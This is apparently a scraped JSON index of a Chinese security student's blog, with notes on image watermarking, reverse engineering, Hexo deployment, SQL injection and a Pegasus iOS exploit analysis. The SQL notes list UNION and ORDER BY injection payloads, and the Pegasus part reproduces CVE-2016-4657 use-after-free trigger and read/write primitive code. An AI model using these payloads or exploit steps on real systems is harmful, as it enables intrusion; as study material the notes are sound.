between the number of bits to be embedded and the number of bit-errors that can be corrected. the technique embeds medical text watermarks into selected sub-band of discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。 Any image com-prises of two sections called ROI and NROI","text":"state-of-the-art 最先进的Error Correcting Codes ECCdiscrete wavelet transform (DWT) 离散小波变换The ECC based watermarking methods attempt to find a trade-off between the number of bits to be embedded and the number of bit-errors that can be corrected. the technique embeds medical text watermarks into selected sub-band of discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。 Any image com-prises of two sections called ROI and NROI ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is present in this area [105]. NROI is an area of image that does not have an important data i.e. background of image. The spatial domain tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple. In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform (DWT), discrete cosine transform (DCT), singular value decomposition (SVD) and discrete Fourier transform (DFT).finite energy function 有限能量函数 在数位信号处理领域中，降采样，又作减采集,是一种多速率数字信号处理的技术或是降低信号采样率的过程，通常用于降低数据传输速率或者数据大小。降采样因子（常用表示符号为＂M＂）一般是大于１的整数或有理数。这个因子表达采样周期变成原来的M倍，或者等价表示采样率变成原来的1/M倍。 采样率的降低会造成频谱的压缩，因此需要利用滤波器确保在较低的采样频率下不发生混叠，确保奈奎式采样定理依旧成立。 形式幂级数上的一个重要映射是系数的提取操作：将一个形式幂级数映射到它的X^n的系数。这个操作常常记作[X^n]， 以一变数为t 的函数 f(t) 为例，f(t) 经过一积分转换T 得到Tf(u)：其中 K 是个确定的二元函数, 称为此积分变换的核函数（kernel function）或核（nucleus）。当选取不同的积分域和变换核时，就得到不同名称的积分变换。f(t) 称为象原函数，Tf(u) 称为 f(t) 的象函数，在一定条件下，它们是一一对应而变换是可逆的。 定义在实数域上的实函数相对于值c的n阶矩为: 如果f(x)是概率密度函数，则容易看出相对于值0的1阶矩是连续随机变量的数学期望。 vanishing moment 母小波定义为其中a是缩放因子，当|a|&lt;1时，母小波被压缩，在时间轴上有较小的支撑度，并且对应到高频，因为母小波变窄、变化变快， 反之，当|a|&gt;1时，母小波变宽、变化较慢，所以对应到低频。b则是平移参数，用来决定母小波的位置。小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。在信号处理中，窗函数（英语：window function）是一种除在给定区间之外取值均为0的实函数。譬如：在给定区间内为常数而在区间外为0的窗函数被形象地称为矩形窗。任何函数与窗函数之积仍为窗函数，所以相乘的结果就像透过窗口“看”其他函数一样 变换(Transform)、量化(Quantization)和编码(Coding)[另外，当输入信号为二维时（例如：影像），短时距傅里叶变换的输出为四维度，但小波变换仍是二维信号，所以在影像处理上通常会使用小波变换而非短时距傅里叶变换。 ΣΣ 这是二重求和符号12345i=m j=n..Σ... Σ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+i=1 j=1 . . . . . . .+a2b1+a2b2+ . . . +a2bn+. . . . . .. . . . . . . . . . +. . . . +. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>笔记1","slug":"Medical Image WatermarkingTechniques and Applications>>笔记1","date":"2020-01-21T11:30:44.000Z","updated":"2020-01-21T11:33:29.920Z","comments":true,"path":"2020/01/21/Medical Image WatermarkingTechniques and Applications>>笔记1/","link":"","permalink":"http://finsenty54.github.io/2020/01/21/Medical Image WatermarkingTechniques and Applications>>笔记1/","excerpt":"the water-mark robustness is the key performance parameter. a watermark can be embedded in every frame. watermarking that pro-tects the content even after decryption","text":"the water-mark robustness is the key performance parameter. a watermark can be embedded in every frame. watermarking that pro-tects the content even after decryption due to higher data embedding capacity of image, visible watermark is a secondary translu-cent overlaid into the primary image. Dual watermark is a combination of a visible and an invisible watermark the watermarking system consists of two processes - encoding and extraction process lossy compression 有损压缩steganography 隐写术obustness 健壮性exponentially 指数地archiving 存档geometrical 几何Classification 分类Spatial 空间的cryptography 密码学pixel 像素点 [ˈpɪksl]designated 特定的confidentiality 保密on account of 由于Tamper 篡改confidentiality 机密性","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"《逆向工程核心原理》学习笔记4","slug":"《逆向工程核心原理》学习笔记4","date":"2019-11-29T08:05:04.000Z","updated":"2019-11-29T08:12:54.684Z","comments":true,"path":"2019/11/29/《逆向工程核心原理》学习笔记4/","link":"","permalink":"http://finsenty54.github.io/2019/11/29/《逆向工程核心原理》学习笔记4/","excerpt":"在PE文件中找到什么，在内存同样可以找到 PE文件组成DOS header DOS stub PE file header Image Optional Header Section table Data Directories Sections","text":"在PE文件中找到什么，在内存同样可以找到 PE文件组成DOS header DOS stub PE file header Image Optional Header Section table Data Directories Sections PE header 通常位于[imagebase]~[imagebase+1000]memory double click 改变PE entry point 以跳过一些代码binary fill with nopsPE header通常大小是1000h EAT 库用来方便其他程序使用函数 trick弹出消息框的地方，pased， alt+f9 , 再点消息框（80%的情况下有用）在memory窗口下搜索，内存中的数据find reference","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"《逆向工程核心原理》学习笔记3","slug":"《逆向工程核心原理》学习笔记3","date":"2019-11-21T12:44:21.000Z","updated":"2019-11-21T12:48:27.861Z","comments":true,"path":"2019/11/21/《逆向工程核心原理》学习笔记3/","link":"","permalink":"http://finsenty54.github.io/2019/11/21/《逆向工程核心原理》学习笔记3/","excerpt":"windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中 FFFFFFFF==-1 双击可改变FLAG 寄存器值","text":"windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中 FFFFFFFF==-1 双击可改变FLAG 寄存器值 双击EIP回去 in ollydbg info 从一个API中返回总在EAX中 PE文件。内存节区头要在各自最小基本单位的倍数上，所以使用NULL填充 RVA+imageBase==VA(绝对地址） PE头内部使用RVA 4D5A =,,,MZ （PE文件开头，IMAGE_DOS_HEADER) INTEL 小端序：：e_lfanew==000000E0 32位EXE ImageBase == 00400000","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"bug","slug":"bug","date":"2019-11-20T12:25:45.000Z","updated":"2019-11-20T12:29:19.438Z","comments":true,"path":"2019/11/20/bug/","link":"","permalink":"http://finsenty54.github.io/2019/11/20/bug/","excerpt":"修复了发布时间超前的问题–在配置文件中将时区修改为Asia/Shanghai2019-11-20 20:28:32 星期三","text":"修复了发布时间超前的问题–在配置文件中将时区修改为Asia/Shanghai2019-11-20 20:28:32 星期三","categories":[],"tags":[{"name":"bug","slug":"bug","permalink":"http://finsenty54.github.io/tags/bug/"}]},{"title":"《逆向工程核心原理》学习笔记2","slug":"《逆向工程核心原理》学习笔记2","date":"2019-11-20T12:02:41.000Z","updated":"2019-11-20T13:05:34.766Z","comments":true,"path":"2019/11/20/《逆向工程核心原理》学习笔记2/","link":"","permalink":"http://finsenty54.github.io/2019/11/20/《逆向工程核心原理》学习笔记2/","excerpt":"栈就是一小段内存空间，大小记录在PE头中 RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理 Nags 唠叨 VB ThunRTMain 函数 调用消息框 rtcMsgBox","text":"栈就是一小段内存空间，大小记录在PE头中 RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理 Nags 唠叨 VB ThunRTMain 函数 调用消息框 rtcMsgBox Set Breakpoint on every call to rtcMsgBox 1 opcode == 1 byte 4 bytes == 1 dword registers is 32 bit Lena视频学习这是书本介绍的，这是tuts4youcrackme下载地址，里面还有视频教程和一些其他教程。 Assembler : The Basics In ReversingSS stack segmentC-Flag &gt;FFFFFFFF and &lt;0 时设置segmens(a page in a book) + offsets(a specific line on that page) add eax,ebx ;; Register, Register add eax,123 ;; Register, Value add eax,dword ptr [404000] ;; Register, Dword Pointer [value] add eax,dword ptr [eax] ;; Register, Dword Pointer [register] add eax,dword ptr [eax+00404000] ;; Register, Dword Pointer [register+value] add dword ptr [404000],eax ;; Dword Pointer [value], Register add dword ptr [404000],123 ;; Dword Pointer [value], Value add dword ptr [eax],eax ;; Dword Pointer [register], Register add dword ptr [eax],123 ;; Dword Pointer [register], Value add dword ptr [eax+404000],eax ;; Dword Pointer [register+value], Register add dword ptr [eax+404000],123 ;; Dword Pointer [register+value], value INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively. JA* - Jump if (unsigned) above - CF=0 and ZF=0 JAE - Jump if (unsigned) above or equal - CF=0 JB* - Jump if (unsigned) below - CF=1 JBE - Jump if (unsigned) below or equal - CF=1 or ZF=1 JC - Jump if carry flag set - CF=1 JCXZ - Jump if CX is 0 - CX=0 JE** - Jump if equal - ZF=1 JECXZ - Jump if ECX is 0 - ECX=0 JG* - Jump if (signed) greater - ZF=0 and SF=OF (SF = Sign Flag) JGE* - Jump if (signed) greater or equal - SF=OF JL* - Jump if (signed) less - SF != OF (!= is not) JLE* - Jump if (signed) less or equal - ZF=1 and OF != OF JMP** - Jump - Jumps always JNA - Jump if (unsigned) not above - CF=1 or ZF=1 JNAE - Jump if (unsigned) not above or equal - CF=1 JNB - Jump if (unsigned) not below - CF=0 JNBE - Jump if (unsigned) not below or equal - CF=0 and ZF=0 JNC - Jump if carry flag not set - CF=0 JNE** - Jump if not equal - ZF=0 JNG - Jump if (signed) not greater - ZF=1 or SF!=OF JNGE - Jump if (signed) not greater or equal - SF!=OF JNL - Jump if (signed) not less - SF=OF JNLE - Jump if (signed) not less or equal - ZF=0 and SF=OF JNO - Jump if overflow flag not set - OF=0 JNP - Jump if parity flag not set - PF=0 JNS - Jump if sign flag not set - SF=0 JNZ - Jump if not zero - ZF=0 JO - Jump if overflow flag is set - OF=1 JP - Jump if parity flag set - PF=1 JPE - Jump if parity is equal - PF=1 JPO - Jump if parity is odd - PF=0 JS - Jump if sign flag is set - SF=1 JZ - Jump if zero - ZF=1 LEA (Load Effective Address)Syntax: LEA dest,srcLEA can be treated the same way as the MOV instruction. It isn’t used too much for its original function, but more for quick multiplications like this: lea eax, dword ptr [4*ecx+ebx] which gives eax the value of 4*ecx+ebxptr== pointer POPSyntax: POP destPOP loads the value of byte/word/dword ptr [esp] jian接寻址 esp指向的值zuo wei dizhiand puts it into dest. TESTSyntax: TEST operand1, operand2This instruction is in 99% of all cases used for “TEST EAX, EAX”. It performs a LogicalAND(AND instruction)but does not save the values. It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared. XORSyntax: XOR dest,srcThe XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.To understand XOR better, consider those two binary values: 1001010110 0101001101 If you XOR them, the result is 1100011011 The most often seen use of XOR is “XOR, EAX, EAX”.This will set EAX to 0, because when you XOR a value with itself, the result is always 0. I hope you understand why, elsewrite down a value on paper and try ;)","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"《逆向工程核心原理》学习笔记1","slug":"《逆向工程核心原理》学习笔记1","date":"2019-11-19T15:06:56.000Z","updated":"2019-11-19T15:18:42.530Z","comments":true,"path":"2019/11/19/《逆向工程核心原理》学习笔记1/","link":"","permalink":"http://finsenty54.github.io/2019/11/19/《逆向工程核心原理》学习笔记1/","excerpt":"买这本书有一年了，但只看了一点点，希望能学完 保存更改到可执行文件，1保存到COPY TO EXECUTABLE FILE，2选择SAVE FILE 应用程序被加载到内存时，有一最小分配空间 space = assemble，用于更改代码","text":"买这本书有一年了，但只看了一点点，希望能学完 保存更改到可执行文件，1保存到COPY TO EXECUTABLE FILE，2选择SAVE FILE 应用程序被加载到内存时，有一最小分配空间 space = assemble，用于更改代码 大端序 12 34 小端序 34 12 一个字节里顺序一样 逆序压栈，栈FILO 栈窗口，address-relative to EBP EBP ESP 存储的是栈地址-》代表数据 1.CALL 压入下一地址 -1 2.PUSH 压入上一栈帧基地址 -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP 取出基地址 +1 6.RETN 取出下一地址+1 local 局部变量 ARG 参数 test = and =0 则 ZF=1 JE ZF=1 跳转 局部对象存储在栈区 选中地址，Follow in dump dump中，long-address with ASCII dump VB使用unicode API get…Text 调试前预测代码的实现 先上托，找到栈帧生成部分","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"在新电脑上重新部署hexo","slug":"在新电脑上重新部署hexo","date":"2019-11-19T03:31:43.000Z","updated":"2019-11-19T06:19:51.580Z","comments":true,"path":"2019/11/19/在新电脑上重新部署hexo/","link":"","permalink":"http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/","excerpt":"近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了 1. 前期准备hexo安装遵循该页面进行git和nodejs的安装将之前的hexo文件整个拷贝过来","text":"近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了 1. 前期准备hexo安装遵循该页面进行git和nodejs的安装将之前的hexo文件整个拷贝过来 2. 配置SSH生成rsa公私钥 $ cd ~/.ssh # Checks to see if there is a directory named &quot;.ssh&quot; in your user directory $ ssh-keygen -t rsa -C &quot;your_email@example.com&quot; # Creates a new ssh key using the provided email Generating public/private rsa key pair. Enter file in which to save the key (/home/you/.ssh/id_rsa): 然后在GitHub里添加公钥，在项目的setting里有一deploy key，在这里添加公钥使用下列命令验证 ssh -T git@github.com 如果不行，就是没有在.ssh文件夹里创建，需要接下来的两步 ssh-agent -s ssh-add ~/.ssh/id_rsa 若提示要输入密码什么的，则在_config.yml配置文件中修改repo deploy: type: git repo: git@github.com:chengjianhua/chengjianhua.github.io.git branch: master 这样就可以了，不用npm install或initial","categories":[],"tags":[{"name":"else","slug":"else","permalink":"http://finsenty54.github.io/tags/else/"}]},{"title":"burpsuite 安全学院笔记","slug":"sql-more-details","date":"2019-05-17T02:33:13.000Z","updated":"2019-11-19T06:17:16.100Z","comments":true,"path":"2019/05/17/sql-more-details/","link":"","permalink":"http://finsenty54.github.io/2019/05/17/sql-more-details/","excerpt":"For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. ‘ ORDER BY 1–‘ ORDER BY 2–‘ ORDER BY 3– ‘ UNION SELECT NULL–‘ UNION SELECT NULL,NULL–‘ UNION SELECT NULL,NULL,NULL–","text":"For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. ‘ ORDER BY 1–‘ ORDER BY 2–‘ ORDER BY 3– ‘ UNION SELECT NULL–‘ UNION SELECT NULL,NULL–‘ UNION SELECT NULL,NULL,NULL–The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ‘ UNION SELECT NULL FROM DUAL–.The payloads described use the double-dash comment sequence – to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. Database type QueryMicrosoft, MySQL SELECT @@versionOracle SELECT * FROM v$versionPostgreSQL SELECT version() For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the “Cluster bomb” attack type, and work through all permutations of offsets and character values. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The “Status” column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]},{"title":"pegasus分析","slug":"pegasus分析","date":"2019-04-16T00:54:59.000Z","updated":"2019-11-18T11:59:16.146Z","comments":true,"path":"2019/04/16/pegasus分析/","link":"","permalink":"http://finsenty54.github.io/2019/04/16/pegasus分析/","excerpt":"PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。 阶段二越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。","text":"PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。 阶段二越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。 阶段三安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。 第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。 CVE-2016-4657第一阶段用到了WebKit’s JavaScriptCore library 中的漏洞CVE-2016-4657。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。 背景MarkedArgumentBuffer中的slowAppend()函数中存在这个漏洞，并且可以在静态方法definePropertries()中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。 1234567891011121314size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;MarkedArgumentBuffer markBuffer;for(size_t i =0;i&lt;numProperties;i++)&#123; JSValue prop = properties-&gt;get(exec,propertyNames[i]); if(exec-&gt;hadException()) return jsNull(); PropertyDescriptor descriptor; if(!toPropertyDescriptor(exec, prop,descriptor)) return jsNull(); descriptors.append(descriptor);&#125; 如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。 1234567for(size_t i=0;i&lt;numProperties; i++)&#123; Identifier propertyName = propertyNames[i]; if(exec-&gt;propertyName().isPrivateName(properName)) continue; object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],true);&#125; 这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了MarkedArgumentBuffer，临时存储变量值，防止被回收。 首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。 MarkedArgumentBuffer维持一个inline栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。 12345678910111213141516171819202122232425262728293031class MarkedArgumentBuffer &#123; ... private: static const size_t inlineCapacity=8; ... public: ... MarkedArgumentBuffer() :m_size(0) ,m_capacity(inlineCapacity) ,m_buffer(m_inlineBuffer) ,m_markSet(0) &#123; &#125; ... void append(JSValue v)&#123; if(m_size &gt;= m_capacity) return slowAppend(v); slotFor(m_size)=JSValue::encode(v); ++m_size; &#125; ... private: ... int m_size; int m_capacity; EncodedJSValue m_inlineBuffer[inlineCapacity]; EncodeedJSValue* m_buffer; ListSet* m_markSet;&#125; inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。123456789101112void MarkedArgumentBuffer::slowAppend(JSValue v)&#123; int newCapacity = m_capacity*4; EncodedJSValue* newBuffer = new EncodeedJSValue[newCapacity]; for(int i=0;i&lt;m_capacity;++i) newBuffer[i]=m_buffer[i]; if (EncodedJSValue* base=mallocBase()) delete [] base; m_buffer=newBuffer; m_capacity=newCapacity;&#125; 一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的m_markListSet并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动markListSet中。1234567891011121314//As long as our size stays within our Vetor's inline//capacity, all our values are allocated on the stack, and //therefore don't need explicit marking. Once our size exceeds //our Vector's inline capacity, though, our values move to the //heap, where they do need explicit marking.for (int i=0; i&lt;m_size;++i)&#123; Heap* heap=Heap::heap(JSValue::decode(slotFor(i))); if(!heap) continue; m_markSet = &amp;heap-&gt;markListSet(); m_markSet-&gt;add(this); break;&#125; 上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。12345inline Heap* Heap::heap(const JSValue v)&#123; if(!v.isCell()) return 0; return heap(v.asCell());&#125; JSValue有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。JSValue::isCell() 函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。123inline bool JSValue::isCell() const&#123; return !(u.asInt64&amp;TagMask);&#125; 因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。 攻击Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。 设置触发漏洞攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。123456789101112131415161718192021222324var arr=new Array(2047);var not_number=&#123;&#125;;not_number.toString=function()&#123; arr=null; props[\"stale\"]['value']=null; ...//Trigger garbage collection and reallocation over stale object return 10;&#125;;var props=&#123; p0:&#123;value:0&#125;, p1:&#123;value:1&#125;, p2:&#123;value:2&#125;, p3:&#123;value:3&#125;, p4:&#123;value:4&#125;, p5:&#123;value:5&#125;, p6:&#123;value:6&#125;, p7:&#123;value:7&#125;, p8:&#123;value:8&#125;, length:&#123;value:not_number&#125;, stale:&#123;value:arr&#125;, after:&#123;value:666&#125;&#125;;var target=[];Object.defineProperties(target,props); 经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。 当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。123456789101112131415var attempts=new Array(4250000);var pressure=new Array(100);...not_number.toString=function()&#123; ... for(var i=0;i&lt;pressure.length;i++)&#123; pressure[i]=new Unit32Array(262144); &#125; var buffer=new ArrayBuffer(80); var unitArray=new Unit32Array(buffer); unitArray[0]=0xAABBCCDD; for(i =0;i&lt;attempts.length;i++)&#123; attempts[i]=new Unit32Array(buffer); &#125;&#125; attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。 完成后，会检测垃圾回收是否触发。1234567var before_len=arr.length;Object.defineProperties(target,props);stale=targets.stale;var after_len=stale.length;if(before_len==after_len)&#123; throw new RecoverableException(8);&#125; 如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。 获取任意读写原语假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。 攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。123456789for(x=attempts.length-1;x&gt;=1;x--)&#123; if(attempts[x].length != 80/4)&#123; if(attempts[x].length==0xFFFFFFFF)&#123; memory_view=attempts[x]; ... break; &#125; &#125;&#125; 获取对象地址完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。 本地代码执行Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。12345678var body=' 'for (var k=0;k&lt;0x600;k++)&#123; body+='try &#123;&#125; catch(e);';&#125;var to_overwrite=new Function('a',body);for(var i=0;i&lt;0x1000;i++)&#123; to_overwrite();&#125; 可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。 回避检测当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。1234window._proto_._proto_=null;x=new String(\"a\");x._proto_._proto_._proto_=window;x.Audio; 绕过KASLR注入的第二阶段：内核位置泄露第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。 分析KASLR绕过阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。 首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。 32位和63位二进制包不同的地方32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。 